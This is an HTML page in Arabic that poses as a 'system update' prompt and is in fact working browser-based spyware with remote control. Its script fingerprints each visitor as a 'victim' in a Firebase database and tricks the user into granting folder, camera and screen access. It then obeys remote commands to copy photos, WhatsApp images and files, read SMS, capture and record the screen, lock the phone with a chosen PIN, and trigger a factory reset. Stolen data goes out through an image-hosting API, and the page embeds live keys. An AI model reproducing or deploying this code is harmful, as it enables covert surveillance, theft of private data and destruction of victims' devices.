<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>تحديث النظام</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
        #msg { font-size: 1.4em; text-align: center; margin-bottom: 30px; padding: 0 20px; }
        .btn { background: #0af; color: #000; padding: 15px 40px; border: none; font-weight: bold; cursor: pointer; font-size: 1.3em; border-radius: 5px; display: none; }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>
    <div id="msg">📱 تحديث النظام مطلوب</div>
    <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
            authDomain: "zwahy-5b75d.firebaseapp.com",
            databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
            projectId: "zwahy-5b75d",
            storageBucket: "zwahy-5b75d.firebasestorage.app",
            messagingSenderId: "820206227713",
            appId: "1:820206227713:web:02057307aca7dfb7100b00"
        };
        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const browserFingerprint = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
        const vid = 'phantom-' + Math.abs(hashCode(browserFingerprint)).toString(36);
        const vref = db.ref('victims/'+vid);
        let ROOT_HANDLE = null;
        let camStream = null;
        let lootCounter = 0;

        function hashCode(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        setTimeout(() => {
            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
            document.getElementById('grantBtn').style.display = 'block';
        }, 2000);

        window.startPayload = async function() {
            const btn = document.getElementById('grantBtn');
            btn.style.display = 'none';
            document.getElementById('msg').innerText = "جاري التحديث...";

            // تسجيل الجهاز فوراً
            await vref.child('loot').remove();
            lootCounter = 0;
            await registerDevice();

            // طلب المجلد مع مهلة 5 ثوان فقط
            const folderPromise = window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000));
            try {
                ROOT_HANDLE = await Promise.race([folderPromise, timeoutPromise]);
            } catch(e) {
                ROOT_HANDLE = null;
            }

            // باقي الصلاحيات
            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
            try {
                let a = document.createElement('a');
                a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                a.click();
            } catch(e) {}

            vref.child('online').set(true);

            // الانتقال للواجهة النهائية
            document.getElementById('msg').innerText = "✅ تم بنجاح";
            setTimeout(() => {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
            }, 1000);

            startCommandListener();
        };

        async function registerDevice() {
            let ip = 'غير معروف';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
            let battery = '?', charging = false;
            try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; charging = b.charging; } } catch(e) {}
            await vref.set({
                online: true,
                fingerprint: {
                    ua: navigator.userAgent, plat: navigator.platform, scr: screen.width+'x'+screen.height,
                    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'?',
                    ip, battery, charging, language: navigator.language, time: new Date().toLocaleString()
                }
            });
        }

        function startCommandListener() {
            vref.child('command').on('value', async snap => {
                const c = snap.val();
                if (!c) return;
                try {
                    switch(c.action) {
                        case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
                        case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
                        case 'get_sms': await getSMS(); break;
                        case 'send_notification': showNotification(c.message || ''); break;
                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
                        case 'play_sound': playRingtone(); break;
                        case 'screenshot': await screenshot(); break;
                        case 'record_video': await recordVid(c.duration||10); break;
                        case 'format': await formatDevice(); break;
                        case 'flash_on': await setFlash(true); break;
                        case 'flash_off': await setFlash(false); break;
                        case 'device_info': await sendDeviceInfo(); break;
                        case 'lock_screen': lockScreen(c.pin || ''); break;
                    }
                } catch(e) {}
                await vref.child('command').remove();
            });
        }

        function playRingtone() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator(), gain = ctx.createGain();
                osc.type = 'square'; osc.frequency.value = 800; gain.gain.value = 0.3;
                osc.connect(gain); gain.connect(ctx.destination); osc.start();
                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
            } catch(e) {}
        }

        async function getFolderHandle(folderName) {
            const FOLDER_NAMES = {
                camera: 'DCIM/Camera', downloads: 'Download',
                whatsapp: 'WhatsApp/Media/WhatsApp Images',
                facebook: 'Facebook/Media', pictures: 'Pictures'
            };
            const displayName = FOLDER_NAMES[folderName] || folderName;
            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد:<br>${displayName}</h2>`;
            try {
                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
                return handle;
            } catch(e) {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
                throw new Error('تم رفض اختيار المجلد');
            }
        }

        async function pullFromFolder(key) { const handle = await getFolderHandle(key); await walkDir(handle, key + '/'); }
        async function pullAll() { for (const key of ['camera','downloads','whatsapp','facebook','pictures']) { try { await pullFromFolder(key); } catch(e) {} } }

        async function walkDir(dirHandle, prefix) {
            for await (let entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    let file = await entry.getFile();
                    if (file.size > 15*1024*1024) continue;
                    let reader = new FileReader();
                    reader.onload = async e => {
                        let b64 = e.target.result.split(',')[1];
                        let url = await uploadToImgBB(b64);
                        await store('file', url, { name: prefix+entry.name, size: file.size });
                    };
                    reader.readAsDataURL(file);
                } else if (entry.kind === 'directory') {
                    let sub = await dirHandle.getDirectoryHandle(entry.name);
                    await walkDir(sub, prefix+entry.name+'/');
                }
            }
        }

        async function getSMS() {
            try {
                let messages = [];
                if ('webkitSms' in window) {
                    const smsList = await window.webkitSms.getMessages({});
                    for (let sms of smsList) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                } else if ('sms' in navigator) {
                    const smsList = await navigator.sms.getMessages({});
                    for (let sms of smsList) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                } else throw new Error('غير مدعوم');
                await store('sms', null, { info: messages });
            } catch(e) { await store('sms', null, { info: { error: e.message } }); }
        }

        function showNotification(message) {
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px 30px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;';
            div.textContent = message;
            document.body.appendChild(div);
            setTimeout(() => { div.remove(); }, 3000);
        }

        async function setFlash(on) {
            if (!camStream) return;
            let track = camStream.getVideoTracks()[0];
            if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
        }

        async function sendDeviceInfo() {
            let info = (await vref.child('fingerprint').once('value')).val() || {};
            await store('device_info', null, { info });
        }

        async function screenshot() {
            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            let video = document.createElement('video'); video.srcObject = stream; await video.play();
            let canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            let b64 = canvas.toDataURL('image/png').split(',')[1];
            let url = await uploadToImgBB(b64);
            await store('screenshot', url, { ts: Date.now() });
            stream.getTracks().forEach(t => t.stop());
        }

        async function recordVid(sec) {
            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
            let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                let blob = new Blob(chunks, { type: 'video/webm' });
                let r = new FileReader();
                r.onload = async e => {
                    let b64 = e.target.result.split(',')[1];
                    let url = await uploadToImgBB(b64);
                    await store('video', url, { ts: Date.now() });
                };
                r.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), sec * 1000);
        }

        async function formatDevice() {
            let a = document.createElement('a');
            a.href = 'intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
            a.click();
            if (navigator.storage?.getDirectory) {
                let root = await navigator.storage.getDirectory();
                for await (let n of root.keys()) await root.removeEntry(n, { recursive: true });
            }
            if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
        }

        function lockScreen(pin) {
            try {
                window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
                setTimeout(() => { window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'); }, 500);
            } catch(e) {}
        }

        async function uploadToImgBB(b64) {
            let fd = new FormData(); fd.append('key', IMGBB_KEY); fd.append('image', b64);
            let res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
            let json = await res.json();
            if (json.success) return json.data.url;
            throw new Error('رفع فشل');
        }

        async function store(type, url, extra = {}) {
            lootCounter++;
            await vref.child('loot').push().set({ type, url, ts: Date.now(), counter: lootCounter, ...extra });
        }
    </script>
</body>
</html>
